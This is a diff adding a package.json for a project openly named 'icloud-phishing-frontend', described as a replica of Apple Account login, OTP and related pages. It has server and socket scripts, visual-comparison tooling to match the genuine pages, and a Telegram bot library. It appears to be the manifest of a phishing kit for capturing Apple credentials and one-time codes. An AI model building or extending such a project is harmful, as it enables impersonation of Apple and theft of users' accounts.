@@ -1,0 +1,46 @@
+{
+  "name": "icloud-phishing-frontend",
+  "version": "1.0.0",
+  "description": "React + Tailwind front-end replica of the Apple Account pages (login, loading, OTP, terms, success).",
+  "main": "index.js",
+  "scripts": {
+    "dev": "vite",
+    "build": "vite build",
+    "preview": "vite preview",
+    "serve": "node server/index.js",
+    "socket": "node server/socket/index.js",
+    "backend": "concurrently -k -n web,socket -c blue,magenta \"node server/index.js\" \"node server/socket/index.js\"",
+    "start": "npm run build && npm run backend",
+    "compare": "sh compare/py.sh compare/compare.py",
+    "compare:flow": "sh compare/py.sh compare/flow_test.py",
+    "compare:viewer": "sh compare/py.sh compare/make_viewer.py",
+    "compare:width": "sh compare/py.sh compare/width_check.py",
+    "compare:chrome": "sh compare/py.sh compare/chrome_check.py",
+    "compare:responsive": "sh compare/py.sh compare/responsive_check.py",
+    "test:socket": "node server/test/socket.test.mjs"
+  },
+  "keywords": [],
+  "author": "",
+  "license": "ISC",
+  "type": "module",
+  "dependencies": {
+    "dotenv": "^18.0.9",
+    "express": "^5.3.0",
+    "grammy": "^1.46.0",
+    "react": "^19.3.1",
+    "react-dom": "^19.3.1",
+    "socket.io": "^4.8.4",
+    "socket.io-client": "^4.8.4",
+    "undici": "^8.12.3",
+    "zod": "^4.6.7"
+  },
+  "devDependencies": {
+    "@vitejs/plugin-react": "^6.2.1",
+    "autoprefixer": "^10.6.2",
+    "concurrently": "^10.0.6",
+    "postcss": "^8.5.32",
+    "tailwindcss": "^3.4.17",
+    "vite": "^8.3.5"
+  },
+  "private": true
+}
